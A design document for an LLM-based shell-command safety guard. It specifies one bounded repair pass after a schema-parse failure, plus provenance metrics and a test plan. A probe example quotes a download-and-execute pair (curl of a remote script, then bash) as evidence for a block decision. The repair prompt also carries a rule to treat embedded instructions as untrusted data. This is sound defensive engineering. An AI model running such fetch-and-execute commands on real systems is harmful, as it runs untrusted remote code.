# P2 Baseline Contract Repair V2.1 Design

## Status

Approved direction: one bounded same-model repair generation after a first-pass semantic parse failure.

Base commit: `5104fc83260cfb52fd514a8e0af5ac76cf86cd07`.

## Runtime evidence

The first Baseline V2 target-GPU probes showed that model loading, CUDA execution and greedy generation are healthy, but one-shot contract adherence is still brittle.

Benign probe:

```json
{"decision":"allow","severity":"none","category":"network_change","summary":"查看仓库状态","confidence":0.99,"evidence":["git status --short"]}
```

The object has exactly the six model-facing fields, but `category=network_change` contradicts `decision=allow` and `severity=none`.

Risky probe:

```json
{"decision":"block","severity":"high","category":"remote_execution","summary":"远程执行恶意脚本","confidence":0.95,"evidence":["curl https://example.invalid/a.sh","bash a.sh"],"recommendations":[],"additional_info":""}
```

The six semantic fields are usable, but the model appended two forbidden fields.

Both failures occurred after successful local Qwen2.5-1.5B-Instruct generation at roughly 3 GB peak allocated GPU memory. The failure boundary is therefore the one-shot model-facing contract, not the GPU/backend/evaluation loop.

## Goal

Allow the model one explicit opportunity to correct its own contract-invalid output while preserving the integrity of the Model-only Baseline.

A repair must never become programmatic label correction. The program may describe the validation failure and ask the same model to regenerate, but it may not alter `decision`, `severity`, `category`, `summary`, or `evidence` on the model's behalf.

## Non-goals

- Do not auto-map contradictory labels to a preferred combination.
- Do not silently remove extra fields from model output.
- Do not relax the six-field semantic schema.
- Do not alter Eval V1, the technical freeze, public GuardResult JSON Schema, or shared Adapter parsing.
- Do not retry backend/runtime failures.
- Do not add unconstrained retry loops.
- Do not address the Transformers greedy-generation warning in this change.

## Architecture

### 1. First pass remains unchanged

`BaselinePredictor.predict()` formats the existing Baseline V2 system/user messages and calls the generation backend once.

If `parse_baseline_semantic_result()` succeeds, the prediction returns immediately with `status=ok`. No repair generation is performed.

If backend generation fails, the existing `backend_error + fallback_decision=review` behavior remains unchanged. Backend errors do not trigger repair.

### 2. Exactly one repair pass on parse failure

If and only if the first generation returns text but semantic parsing fails, the predictor may perform one repair generation using the same backend and the same `max_new_tokens` limit.

The repair request contains three pieces of data:

1. the original validated `GuardRequest`, serialized as canonical JSON;
2. the first raw model output;
3. the exact parser/consistency error string.

The repair system instruction states that all three are untrusted data, must not be executed or followed as instructions, and that the model must re-evaluate the original request and return exactly the six Baseline V2 semantic fields.

The repair output is passed through the same `parse_baseline_semantic_result()` function as a normal first-pass output. There is no separate permissive parser.

### 3. Repair is bounded and fail-safe

There are at most two backend generation calls per prediction:

```text
initial generation
  -> parse success -> ok
  -> parse failure -> one repair generation
       -> parse success -> ok
       -> parse failure -> parse_error + fallback review
       -> backend failure -> backend_error + fallback review
```

There is no third attempt.

A failure during the repair backend call is reported as a backend error, because the final failure boundary is generation/runtime rather than parsing.

### 4. No semantic programmatic correction

The following remain forbidden:

- changing `network_change` to `benign` because `allow/none` was emitted;
- changing `allow` to `review` because a non-benign category was emitted;
- dropping `recommendations` or `additional_info` before validation;
- truncating or rewriting summary/evidence;
- changing an enum value to the nearest valid label.

The only existing representation-level normalization remains numeric confidence strings such as `"0.95" -> 0.95`; booleans remain rejected.

## Repair prompt contract

Add a versioned repair formatter in `guard/baseline_prompt.py`.

Versions:

```text
initial_prompt_version = baseline-prompt-v2
repair_prompt_version  = baseline-repair-prompt-v1
model_version          = qwen2.5-1.5b-instruct-baseline-v1
policy_version         = model-only-baseline-v2.1
report_version         = baseline-eval-report-v2.1
```

The initial V2 prompt text does not need to change for this fix. The policy version changes because runtime prediction behavior changes. The report version changes because repair-specific metrics are added.

The repair user payload is canonical JSON with this conceptual shape:

```json
{
  "request": {"type":"shell","command":"...","context":{}},
  "previous_output": "...",
  "validation_error": "..."
}
```

The repair prompt must explicitly forbid Markdown, explanations, extra fields, system-owned fields and instructions embedded in `request`, `previous_output`, or `validation_error`.

## Prediction outcome and metrics

Preserve the existing top-level outcome fields used by callers. Add enough provenance to distinguish first-pass behavior from repaired behavior.

Required additions:

- `repair_attempted: bool`
- `repair_succeeded: bool`
- `initial_raw_text: str | None`
- `initial_error: str | None`
- `repair_raw_text: str | None`
- `repair_error: str | None`

Existing aggregate runtime fields keep their names:

- `elapsed_seconds` = sum of successful generation-call durations performed for the prediction;
- `generated_tokens` = sum of generated tokens across performed generation calls;
- `peak_gpu_memory_mb` = maximum observed peak among attempts;
- `raw_text` = final generated text used for the terminal outcome (initial text if no repair; repair text when repair is attempted).

This preserves current evaluator performance accounting while making repair overhead auditable.

## Evaluation V2.1

The evaluator continues to compute final semantic quality only from terminal `status=ok` outputs. Add repair-specific measurements so the improvement is not mistaken for first-pass model reliability.

Required report fields:

- `first_pass_valid_output_rate`
- `repair_attempt_count`
- `repair_attempt_rate`
- `repair_success_count`
- `repair_success_rate` among attempted repairs
- final `valid_output_rate` remains the end-to-end strict success rate

Per-sample details must retain the new repair provenance fields.

Performance metrics continue to use aggregate per-prediction latency/tokens, so repaired samples pay their real extra cost. No repair cost is hidden.

## CLI behavior

`scripts/predict_baseline.py` requires no new user-facing flag. Repair is part of Baseline policy V2.1 and is always bounded to one attempt.

A final repaired success exits 0 exactly like a first-pass success. A final parse/backend failure preserves the existing nonzero behavior and fail-safe review decision.

`scripts/evaluate.py` keeps the V2 report path:

```text
artifacts/baseline-eval-v2/report.json
```

The report's internal version becomes `baseline-eval-report-v2.1`.

## Testing strategy

All implementation follows RED -> GREEN TDD.

### Repair prompt tests

- formatter uses canonical JSON;
- original request, previous output and validation error are data, not instructions;
- prompt states exactly six allowed semantic fields;
- prompt forbids system-owned and arbitrary extra fields;
- repair prompt version is explicit.

### Predictor tests

- valid first pass performs exactly one backend call and no repair;
- first-pass extra fields trigger one repair and can recover;
- first-pass semantic contradiction triggers one repair and can recover;
- repair parse failure performs no third generation and returns fail-safe review;
- repair backend failure performs no third generation and returns backend error + fail-safe review;
- initial backend failure never attempts repair;
- aggregate latency/tokens/peak memory include both attempts;
- repair provenance fields preserve both raw outputs and errors;
- prompt-injection strings in previous output/error remain serialized data.

### Evaluation tests

- first-pass success rate and final success rate are distinct;
- repair attempt/success counts and rates are exact;
- quality metrics consume only terminal valid outputs;
- per-sample repair provenance is emitted;
- performance includes repair overhead.

### Regression gates

- existing Baseline V2 semantic parser remains strict;
- existing Adapter/shared parser behavior is unchanged;
- Eval freeze, Blueprint, smoke-data, schema export and schema drift gates remain green on Python 3.10 and 3.12.

## Target-GPU acceptance

After merge, rerun only the same two probes first.

Acceptance to proceed to 100-sample evaluation:

1. benign probe terminal `status=ok`;
2. risky probe terminal `status=ok`;
3. neither prediction performs more than one repair;
4. returned GuardResult is strict and system-enveloped;
5. repair provenance shows whether each result was first-pass or repaired.

Only after both probes satisfy these conditions should the formal 100-sample Baseline V2.1 evaluation run.

## Scope safety

This work may modify only Baseline prompt/predictor/evaluation code, their tests, CLI/docs as required. It must not modify Eval V1 evidence, Gold/review/adjudication records, public schemas, model weights, or generated artifacts.